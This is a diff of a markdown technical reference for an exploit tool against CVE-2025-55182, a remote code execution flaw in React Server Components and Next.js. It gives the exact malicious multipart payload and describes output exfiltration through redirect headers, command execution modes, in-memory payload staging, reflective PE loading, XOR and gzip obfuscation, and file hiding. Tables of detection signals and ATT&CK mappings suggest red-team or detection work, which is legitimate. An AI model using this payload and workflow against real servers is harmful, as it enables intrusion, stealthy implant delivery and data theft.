@@ -1,368 +1,121 @@
-# React2Shell Exploit Tool - Code Flow Summary
+# React2Shell Exploit Tool — Technical Reference
 
-This document summarizes the code flow of `react2shell-tool`, focusing on how the tool creates multipart React Server Components payloads, sends POST requests with `Next-Action`, extracts results from the `X-Action-Redirect` header, and provides an interactive shell with command execution, eval-based reconnaissance, upload/download, and file operations.
+Exploit tool for CVE-2025-55182 (React Server Components RCE). Sends malicious multipart POST bodies to Next.js servers, exfiltrates output via `X-Action-Redirect` redirect header.
 
 ## Source Map
 
-| Component | Path | Role |
-|---|---|---|
-| Interactive launcher | `../../resources/payloads/react2shell-tool/run_exploit.py` | Entry point that calls `exploit_tool.main.main()` |
-| Single-shot exploit | `../../resources/payloads/react2shell-tool/exploit.py` | Standalone version for one command or base64 upload through `echo` |
-| CLI parser | `../../resources/payloads/react2shell-tool/exploit_tool/main.py` | Parses `--target`, `--timeout`, and creates `InteractiveShell` |
-| Interactive shell | `../../resources/payloads/react2shell-tool/exploit_tool/shell.py` | REPL, command dispatch, history, run/default execution |
-| Exploit engine | `../../resources/payloads/react2shell-tool/exploit_tool/engine.py` | Creates HTTP session, sends POST, parses response |
-| Payload generator | `../../resources/payloads/react2shell-tool/exploit_tool/payload_generator.py` | Builds multipart body and JavaScript injection |
-| Config | `../../resources/payloads/react2shell-tool/exploit_tool/config.py` | Target URL normalization and timeout |
-| Built-ins | `../../resources/payloads/react2shell-tool/exploit_tool/commands/builtin.py` | help, info, timeout, eval, history |
-| Recon commands | `../../resources/payloads/react2shell-tool/exploit_tool/commands/recon.py` | sysinfo, ipconfig, env, domain, ls, readfile through Node.js APIs |
-| File operations | `../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py` | upload, decode, decompress, copyfile, rename, download, hide, herpload through Node.js `fs`/`zlib`/`child_process` |
-| Charcode helper | `../../resources/payloads/react2shell-tool/exploit_tool/utils.py` | Converts JS strings to `String.fromCharCode(...)` |
-| Local encoder | `../../resources/payloads/react2shell-tool/encode_payload.py` | Encodes local files to base64/certutil-compatible text |
-| Local decoder | `../../resources/payloads/react2shell-tool/decode_payload.py` | Decodes base64/certutil-compatible text back to local binary |
-| Payload compressor | `../../resources/payloads/react2shell-tool/compress_payload.py` | Compresses files with gzip and optionally base64-encodes (T1027.015) |
-
-## High-Level Runtime Flow
-
-```text
-run_exploit.py
-  -> exploit_tool.main.main()
-       -> parse -t/--target and -T/--timeout
-       -> InteractiveShell(target)
-            -> ExploitConfig.normalize_url()
-            -> ExploitEngine(config)
-            -> FileOperations / BuiltinCommands / ReconCommands
-       -> shell.run()
-            -> test connection with engine.execute("whoami")
-            -> read operator input
-            -> dispatch built-in / recon / file-op / run / default command
-            -> engine.execute(command, mode flags)
-                 -> PayloadGenerator.build_exploit_payload()
-                 -> craft_headers()
-                 -> HTTP POST target_url
-                 -> parse X-Action-Redirect
-                 -> base64 decode command output
-```
-
-Core request/response flow:
-
-```text
-InteractiveShell command
-  -> ExploitEngine.execute(command, use_eval/use_spawn)
-  -> PayloadGenerator.build_exploit_payload()
-  -> POST / with:
-       Next-Action: x
-       Content-Type: multipart/form-data; boundary=----HacxMeBoundaryX9K2pLvN4MqR8TdF
-  -> target React/Next server evaluates injected _prefix
-  -> injected code throws NEXT_REDIRECT with /login?a=<base64 output>
-  -> response header X-Action-Redirect contains encoded output
-  -> engine.parse_response() extracts and decodes output
-```
-
-## Vulnerability Model Used by the Tool
-
-The tool targets React Server Components / Next.js request handling where a multipart POST body can supply a malicious model object. Field `0` contains a JSON object with:
-
-```text
-"then":"$1:__proto__:then"
-"_response":{"_prefix":"<injected JavaScript>"}
-"_formData":{"get":"$1:constructor:constructor"}
-```
-
-Field `1` is `"$@0"` and field `2` is `[]`. This shape is designed to make the vulnerable server deserialize attacker-controlled model data and execute the `_prefix` JavaScript inside the Node.js process.
-
-Output exfiltration is not done through the response body. Each payload converts output to base64 and throws a Next.js redirect-shaped error:
-
-```text
-NEXT_REDIRECT;push;/login?a=<base64>;307;
-```
-
-`engine.py` then reads `X-Action-Redirect`, extracts `/login?a=...`, URL-decodes it, base64-decodes it, and prints the decoded output.
-
-## Entry Points
-
-### Interactive Mode
-
-`run_exploit.py` only imports and calls `exploit_tool.main.main()`. `main.py` requires:
-
-```text
--t / --target   target URL or bare host
--T / --timeout  request timeout, default 15 seconds
-```
-
-`ExploitConfig.normalize_url()` prepends `http://` when the user passes a bare hostname. After setup, `InteractiveShell.run()` performs an initial connection test with `whoami`, then enters the REPL.
-
-### Single-Shot Mode
-
-`exploit.py` is a standalone version that duplicates the core classes in one file. It supports:
-
-```text
--t / --target
--c / --command
--f / --upload-file
--T / --timeout
-```
-
-In normal command mode, it builds one `execSync` payload. In `--upload-file` mode, it reads a local base64 text file and sets the payload command to:
-
-```text
-echo <base64 content> > out.b64
-```
-
-This upload path is simpler than the interactive `FileOperations.upload()` path and relies on shell command execution on the target.
-
-## Payload Construction
-
-`PayloadGenerator.build_exploit_payload(command, use_eval=False, use_spawn=False)` has three execution modes.
-
-### Default execSync Mode
-
-Default mode is used for any unrecognized shell input:
-
-```text
-process.mainModule.require('child_process').execSync('<command>').toString()
-```
-
-On Windows, this normally results in `node.exe` spawning `cmd.exe /d /s /c <command>` through Node's `execSync()` implementation. The tool waits for the command to finish, converts stdout to base64, and returns it through the redirect header.
-
-`sanitize_command()` escapes backslashes, double quotes, single quotes, and removes newlines before placing the operator command inside the JavaScript string.
-
-### eval Mode
-
-Eval mode is used by the `eval` built-in, file operations, and recon commands. The injected JavaScript calls:
-
-```text
-eval('<command>')
-```
-
-For complex JavaScript, callers usually wrap code as:
-
-```text
-eval(String.fromCharCode(<comma-separated char codes>))
-```
-
-This avoids nested quote and backslash conflicts inside JSON and JavaScript string literals. Eval mode runs inside the already-compromised Node.js process and does not require a child process unless the JavaScript itself calls `child_process`.
-
-### spawnSync Mode
-
-The `run <exe> [args...]` command sets `use_spawn=True`. `parse_command_for_spawn()` splits the first token as executable and remaining tokens as arguments, then the payload runs:
-
-```text
-var cp = process.mainModule.require('child_process');
-var res = cp.spawnSync('<exe>', ['<arg1>'], {shell:false, encoding:'utf8'});
-```
-
-This directly spawns the target executable without invoking `cmd.exe`. The HTTP request blocks until the spawned process exits.
-
-## HTTP Request Details
-
-`ExploitEngine.craft_headers()` creates:
-
-| Header | Value |
+| File | Role |
 |---|---|
-| `Next-Action` | `x` |
-| `X-Nextjs-Request-Id` | 8 hex chars from SHA-256 of current timestamp |
-| `X-Nextjs-Html-Request-Id` | 20 hex chars from SHA-256 of current timestamp |
-| `Content-Type` | `multipart/form-data; boundary=----HacxMeBoundaryX9K2pLvN4MqR8TdF` |
-| `User-Agent` | Firefox-like Linux user agent |
+| `run_exploit.py` | Interactive entry point → `exploit_tool.main.main()` |
+| `exploit.py` | Single-shot standalone (`-t`, `-c`, `-f`, `-T`) |
+| `exploit_tool/main.py` | CLI parser, creates `InteractiveShell` |
+| `exploit_tool/shell.py` | REPL dispatch |
+| `exploit_tool/engine.py` | HTTP session, POST, response parse |
+| `exploit_tool/payload_generator.py` | Multipart body + JS injection builder |
+| `exploit_tool/config.py` | URL normalization, timeout |
+| `exploit_tool/theme.py` | ANSI color constants |
+| `exploit_tool/commands/builtin.py` | `help`, `info`, `timeout`, `eval`, `history` |
+| `exploit_tool/commands/recon.py` | `sysinfo`, `ipconfig`, `env`, `domain`, `ls`, `readfile` |
+| `exploit_tool/commands/file_ops.py` | `upload`, `stage`, `decode`, `decompress`, `copyfile`, `rename`, `download`, `hide`, `pipeload`, `pipestage` |
+| `exploit_tool/utils.py` | `to_charcode()` — JS string → `String.fromCharCode(...)` |
+| `encode_payload.py` | Local file → base64 text (certutil-compatible) |
+| `decode_payload.py` | Base64 text → binary |
+| `compress_payload.py` | Gzip compress + optional base64 (T1027.015) |
+| `encrypt_payload_xor.py` | Position-dependent XOR encode/decode matching CWLHerpaderping formula (T1027.013) |
 
-The request uses `requests.Session.post()` with `allow_redirects=False` and `verify=False`. The engine classifies failures as `timeout`, `ssl`, `forbidden`, `server_error`, or `unknown`.
+## Exploit Mechanism
 
-## Interactive Shell Dispatch
+Multipart POST to target with:
 
-`InteractiveShell.run()` parses the first token and dispatches commands in this order:
+```
+Next-Action: x
+Content-Type: multipart/form-data; boundary=----HacxMeBoundaryX9K2pLvN4MqR8TdF
 
-| Command family | Handler | Execution behavior |
+field 0: {"then":"$1:__proto__:then","_response":{"_prefix":"<injected JS>"},"_formData":{"get":"$1:constructor:constructor"}}
+field 1: "$@0"
+field 2: []
+```
+
+Server deserializes attacker-controlled model → executes `_prefix` JS inside Node.js process. Output is exfiltrated by throwing a Next.js redirect:
+
+```
+NEXT_REDIRECT;push;/login?a=<base64(output)>;307;
+```
+
+`engine.py` reads `X-Action-Redirect`, URL-decodes, base64-decodes.
+
+## JS Execution Modes
+
+| Mode | Trigger | JS injected | Process created |
+|---|---|---|---|
+| `execSync` (default) | any unrecognized input | `child_process.execSync(cmd)` | `node.exe` → `cmd.exe` |
+| `eval` | recon / file ops / `eval` builtin | `eval(String.fromCharCode(...))` | none (in-process) |
+| `spawnSync` | `run <exe> [args]` | `cp.spawnSync(exe, args, {shell:false})` | `node.exe` → exe directly |
+
+Complex JS uses `new Function(String.fromCharCode(...))()` when `var`/`return`/`try-catch` are needed inside a single expression.
+
+## Shell Command Dispatch
+
+| Command | Handler | Spawn? |
 |---|---|---|
-| `help`, `clear`, `info`, `history`, `timeout`, `eval` | `BuiltinCommands` | Mostly eval-based; `clear` is local terminal only |
-| `sysinfo`, `ipconfig`, `env`, `domain`, `ls`, `readfile` | `ReconCommands` | Node.js APIs through eval, no process spawn |
-| `upload`, `decode`, `decompress`, `copyfile`, `rename`, `download` | `FileOperations` | Node.js `fs`/`zlib` APIs through eval, no process spawn |
-| `hide`, `herpload` | `FileOperations` | `child_process.spawnSync('attrib')` or loader with stdin pipe |
-| `run` | `InteractiveShell.execute_command_spawn()` | `child_process.spawnSync(..., shell:false)` |
-| Anything else | `InteractiveShell.execute_command()` | `child_process.execSync()` |
+| `help`, `clear`, `info`, `history`, `timeout`, `eval` | `BuiltinCommands` | no |
+| `sysinfo`, `ipconfig`, `env`, `domain`, `ls`, `readfile` | `ReconCommands` | no |
+| `upload`, `stage`, `decode`, `decompress`, `copyfile`, `rename`, `download` | `FileOperations` | no |
+| `hide` | `FileOperations` | yes — `spawnSync('attrib', ['+h', path])` |
+| `pipeload` | `FileOperations` | yes — `spawnSync(loader, [], {input: [hdr+payload]})` |
+| `pipestage` | `FileOperations` | yes — same as pipeload but payload streams from attacker memory |
+| `run <exe>` | `InteractiveShell` | yes — `spawnSync(exe, args, {shell:false})` |
+| default | `InteractiveShell` | yes — `execSync(cmd)` → `cmd.exe` |
 
-The prompt includes the normalized target host and command number. `command_history` stores operator commands for `history`.
+## File Operation Details
 
-## Recon Commands
+### upload
+Reads local `.b64` text, streams 2000-char chunks to target via eval (`writeFileSync` / `appendFileSync`). Leaves `.b64` file on target disk.
 
-`ReconCommands` uses `_eval_fn(js_body)` to wrap JavaScript as:
+### stage `[--encrypt] <local_binary> <remote.bin>`
+One-step upload-and-write with no `.b64` artifact on target:
+1. Read raw bytes locally; optionally XOR-encode with `out[i] = in[i] ^ ((0xA3 + i*0x5B) & 0xFF)` if `--encrypt`.
+2. Base64 in Python memory → stream 2000-char chunks into `global.__stageBuffer` via eval.
+3. Single eval: `Buffer.from(global.__stageBuffer,'base64')` → `writeFileSync(dest)` → `delete global.__stageBuffer`.
 
-```text
-(new Function(String.fromCharCode(<body>)))()
-```
+Requires iisnode single-worker so `global` persists across requests.
 
-This pattern allows `var` declarations and `return` statements while still being passed through the eval payload path.
+### pipeload `<payload.b64> <CertEnrollAgent.exe>`
+Reads `.b64` from target disk → decodes in Node.js memory → prepends 4-byte LE size header → `spawnSync(loader, [], {input: [hdr+payload]})`. T1620 — payload bytes never written as binary to disk.
 
-| Command | Node.js APIs | Output |
-|---|---|---|
-| `sysinfo` | `os.hostname()`, `os.platform()`, `os.version()`, `os.userInfo()`, `process.cwd()` | Host, user, cwd, OS, arch, uptime, memory |
-| `ipconfig` | `os.networkInterfaces()`, `dns.getServers()` | Interfaces, IPs, MACs, DNS servers |
-| `env [filter]` | `process.env` | Environment variables, optional substring filter |
-| `domain` | `process.env` | `COMPUTERNAME`, `USERNAME`, `USERDOMAIN`, `USERDNSDOMAIN`, `LOGONSERVER`, profile paths |
-| `ls [path]` | `fs.readdirSync()`, `fs.statSync()`, `path.join()` | Directory listing with size and directory flag |
-| `readfile <path>` | `fs.readFileSync(path, 'utf8')` | Text file contents |
+### pipestage `<local_pe> <CertEnrollAgent.exe>`
+Zero-artifact variant: streams raw PE from attacker memory (same `global.__stageBuffer` mechanism as `stage`) then immediately decodes and spawns loader with stdin pipe. No `.b64` or `.bin` written to target at any point. T1620.
 
-These commands are designed to collect host and environment data without `cmd.exe`, PowerShell, or native OS command process creation.
+### hide `<filepath>`
+`spawnSync('attrib', ['+h', path])` — only operation that spawns `attrib.exe`. Intentionally observable for T1564.001.
 
-## File Operation Flow
+### download `<remote_path>`
+Stats file → readability pre-check via `new Function(...)()` → 8192-byte chunks via `openSync`/`readSync`/`closeSync` → base64 back through redirect header. Binary-safe, no size limit.
 
-File operations also use eval and Node.js `fs`, so the main target-side process remains `node.exe`.
+## Local Helpers
 
-### Upload
-
-`upload <local_file> [remote_dest]` reads a local base64 text file, defaults remote destination to `out.b64`, splits content into 2000-character chunks, then sends each chunk as one eval request:
-
-```text
-chunk 0 -> fs.writeFileSync(dest, chunk)
-chunk N -> fs.appendFileSync(dest, chunk)
-```
-
-The local file is expected to already contain base64 text. `encode_payload.py` can create a certutil-compatible base64 text file from any local input.
-
-### Decode
-
-`decode <input.b64> <output.bin>` runs:
-
-```text
-fs.writeFileSync(output, Buffer.from(fs.readFileSync(input, 'utf8').trim(), 'base64'))
-```
-
-This converts an uploaded base64 text file into the final binary on the target.
-
-### Decompress
-
-`decompress <input.gz> <output.bin>` runs:
-
-```text
-fs.writeFileSync(output, zlib.gunzipSync(fs.readFileSync(input)))
-```
-
-This decompresses a gzip-compressed file using Node.js built-in `zlib` module. No child process is spawned. The attacker uses `compress_payload.py` locally to create gzip+base64 payloads before upload, reducing transfer size by ~62% and evading signature-based detection of raw PE structure (T1027.015).
-
-### Hide
-
-`hide <filepath>` spawns `attrib.exe` to set Windows hidden attribute:
-
-```text
-child_process.spawnSync('attrib', ['+h', filepath], {encoding: 'utf8'})
-```
-
-This is one of the few file operations that **spawns a child process**. Node.js `fs.chmod()` only supports Unix permissions, not Windows file attributes, so `attrib.exe` must be invoked. The process creation is intentionally observable for T1564.001 detection.
-
-### Herpload
-
-`herpload <payload.b64> <loader.exe>` reflectively loads a PE via stdin redirection:
-
-1. Reads base64 file and decodes to Buffer
-2. Prepends 4-byte size header (little-endian DWORD)
-3. Spawns loader executable with `stdin` containing `[size_header + payload_bytes]`
-4. No disk write of payload binary (T1620 - Reflective Code Loading)
-
-This spawns the loader process but eliminates the intermediate disk artifact.
-
-### Copy and Rename
-
-`copyfile` and `rename` call:
-
-```text
-fs.copyFileSync(src, dst)
-fs.renameSync(old, new)
-```
-
-Both treat `server_error` as probable success because some no-output Node.js calls can cause the expected redirect extraction to fail even though the filesystem action completed.
-
-### Download
-
-`download <remote_path>` is binary-safe and chunked:
-
-```text
-fs.statSync(path).size
-openSync/readability check
-loop:
-  fs.openSync(path, 'r')
-  fs.readSync(fd, buffer, 0, read_size, offset)
-  buffer.toString('base64')
-  closeSync(fd)
-local Python base64-decodes each chunk and writes downloaded_<filename>
-```
-
-Chunk size is 8192 bytes. The target sends each chunk back through the same redirect-header base64 channel.
-
-## Local Encode / Decode / Compress Helpers
-
-`encode_payload.py`, `decode_payload.py`, and `compress_payload.py` run locally, not on the target.
-
-`encode_payload.py`:
-
-1. Reads input as bytes.
-2. Base64-encodes it.
-3. Splits output into 64-character lines by default.
-4. Optionally adds certificate markers with `--header`.
-5. Writes a text output file.
-
-`decode_payload.py`:
-
-1. Reads ASCII base64 text.
-2. Removes optional `BEGIN/END CERTIFICATE` markers unless `--keep-headers` is set.
-3. Base64-decodes to bytes.
-4. Writes the output file in binary mode.
-
-`compress_payload.py`:
-
-1. Reads input file as bytes.
-2. Compresses with gzip at level 9 (maximum compression).
-3. Optionally base64-encodes the compressed output with `--b64`.
-4. Line length control via `-l` flag (0 = no wrapping, single line for upload).
-5. Typical compression ratio: ~62% size reduction.
-6. Writes compressed output (`.gz` or `.gz.b64` depending on options).
-
-This enables T1027.015 (Obfuscated Files or Information: Compression) by reducing payload size and evading signature detection during upload.
-
-## Detection-Relevant Code Paths
-
-| Behavior | Code path | Observable artifact |
-|---|---|---|
-| React2Shell exploit request | `ExploitEngine.execute()` -> `session.post()` | HTTP POST to target with `Next-Action: x` and multipart body |
-| Static multipart boundary | `PayloadGenerator.build_exploit_payload()` | Boundary string `----HacxMeBoundaryX9K2pLvN4MqR8TdF` |
-| Malicious Flight model field | `build_exploit_payload()` field `0` | Multipart field containing `"then":"$1:__proto__:then"` and `_response._prefix` |
-| Model reference trigger | `build_exploit_payload()` field `1` | Multipart field body `"$@0"` |
-| Redirect-header output channel | injected JavaScript -> `engine.parse_response()` | `X-Action-Redirect: /login?a=<base64>;307;` |
-| OS command execution | default shell command -> `execSync()` | `node.exe` spawns shell process such as `cmd.exe` on Windows |
-| Direct process execution | `run` -> `spawnSync(..., shell:false)` | `node.exe` spawns specified executable directly |
-| In-process JavaScript execution | `eval` / recon / file ops | Node.js process calls `eval()` / `new Function()` without child process |
-| Node.js recon | `ReconCommands` | Access to `os`, `dns`, `fs`, `path`, and `process.env` modules |
-| File upload | `FileOperations.upload()` | Repeated POSTs write/append base64 chunks to target file |
-| Target-side base64 decode | `FileOperations.decode()` | Node.js writes binary output from base64 text |
-| Target-side gzip decompression | `FileOperations.decompress()` | Node.js `zlib.gunzipSync()` decompresses gzip file, no child process |
-| Set Windows hidden attribute | `FileOperations.hide()` | `node.exe` spawns `attrib.exe` with `['+h', filepath]` arguments |
-| Reflective PE load via stdin | `FileOperations.herpload()` | Reads b64, decodes to Buffer, spawns loader with stdin pipe containing PE bytes |
-| File download | `FileOperations.download()` | Repeated POSTs read target file chunks and return base64 in redirect header |
-| Request ID generation | `PayloadGenerator.generate_hash()` | Timestamp-derived hex values in `X-Nextjs-Request-Id` headers |
-| TLS verification disabled | `requests.Session.post(..., verify=False)` | Client accepts invalid target certificates |
-
-## ATT&CK-Relevant Behaviors
-
-| Behavior | Likely ATT&CK mapping |
+| Script | Function |
 |---|---|
-| Exploiting vulnerable public React/Next application | `T1190` Exploit Public-Facing Application |
-| Server-side JavaScript execution through deserialization/request parsing | `T1059.007` Command and Scripting Interpreter: JavaScript |
-| `execSync()` command execution through shell | `T1059.003` Command and Scripting Interpreter: Windows Command Shell on Windows, or shell equivalent on Linux |
-| Direct executable launch with `spawnSync(..., shell:false)` | `T1106` Native API / execution behavior, depending scenario mapping |
-| Uploading payload chunks through the web exploit channel | `T1105` Ingress Tool Transfer |
-| Decompressing gzip payload via Node.js `zlib.gunzipSync()` | `T1027.015` Obfuscated Files or Information: Compression |
-| Setting Windows hidden attribute via `attrib.exe +h` | `T1564.001` Hide Artifacts: Hidden Files and Directories |
-| Reflective PE loading via stdin redirection (no disk artifact) | `T1620` Reflective Code Loading |
-| Reading files through Node.js `fs` and returning contents | `T1005` Data from Local System |
-| Enumerating host/network/environment with Node.js APIs | `T1082`, `T1016`, `T1033`, and related Discovery techniques depending specific command |
-| Returning command/file output via HTTP response header | `T1041` Exfiltration Over C2 Channel or `T1105`, depending scenario context |
+| `encode_payload.py` | raw → base64 text (64-char lines, optional `BEGIN CERTIFICATE` headers) |
+| `decode_payload.py` | base64 text → raw binary |
+| `compress_payload.py` | gzip level 9 + optional base64; ~62% reduction (T1027.015) |
+| `encrypt_payload_xor.py` | XOR `out[i] = in[i] ^ ((0xA3 + i*0x5B) & 0xFF)`; self-inverse; MZ `0x4D` → `0xEE` on disk (T1027.013) |
 
-## Reading Order
+`encrypt_payload_xor.py` constants match `PAYLOAD_XOR_BASE`/`PAYLOAD_XOR_STEP` in `CWLImplant.cpp` so CWLHerpaderping decodes the file in-memory when built with `/p:PayloadXOR=1`. Equivalent to `stage --encrypt` inline.
 
-1. `README.md` for operator-facing usage and mode overview.
-2. `run_exploit.py` and `exploit_tool/main.py` for interactive entry point.
-3. `exploit_tool/shell.py` for REPL dispatch and command families.
-4. `exploit_tool/payload_generator.py` for multipart body and injected JavaScript variants.
-5. `exploit_tool/engine.py` for HTTP request creation and response parsing.
-6. `exploit_tool/commands/recon.py` for no-spawn discovery behavior.
-7. `exploit_tool/commands/file_ops.py` for upload, decode, copy, rename, and download implementation.
-8. `exploit.py` only if single-shot behavior or `--upload-file` behavior matters.
-9. `encode_payload.py` and `decode_payload.py` for local base64 preparation workflows.
+## Detection Signals
+
+| Behavior | Observable |
+|---|---|
+| Exploit request | HTTP POST with `Next-Action: x`, boundary `----HacxMeBoundaryX9K2pLvN4MqR8TdF`, field `"$1:__proto__:then"` |
+| Output channel | `X-Action-Redirect: /login?a=<base64>;307;` |
+| OS command exec | `node.exe` → `cmd.exe` (default shell commands) |
+| Direct spawn | `node.exe` → target exe, no `cmd.exe` (`run` command) |
+| In-process recon | Node.js `os`/`dns`/`fs`/`path`/`process.env` — no child process |
+| In-memory stage | Repeated POSTs accumulate `global.__stageBuffer`; single `writeFileSync` |
+| XOR-encoded file on disk | No valid MZ header; first byte `0xEE` instead of `0x4D` (T1027.013) |
+| Gzip payload | `.gz` upload + `zlib.gunzipSync()` in-process — no child process (T1027.015) |
+| Hidden attribute | `node.exe` spawns `attrib.exe +h <path>` (T1564.001) |
+| Reflective load (pipeload) | `node.exe` spawns `CertEnrollAgent.exe` with stdin pipe containing PE bytes (T1620) |
+| Reflective load (pipestage) | same as pipeload; no `.b64` or `.bin` written at any stage (T1620) |
+| File download | Repeated POSTs, base64 chunks returned in redirect header |
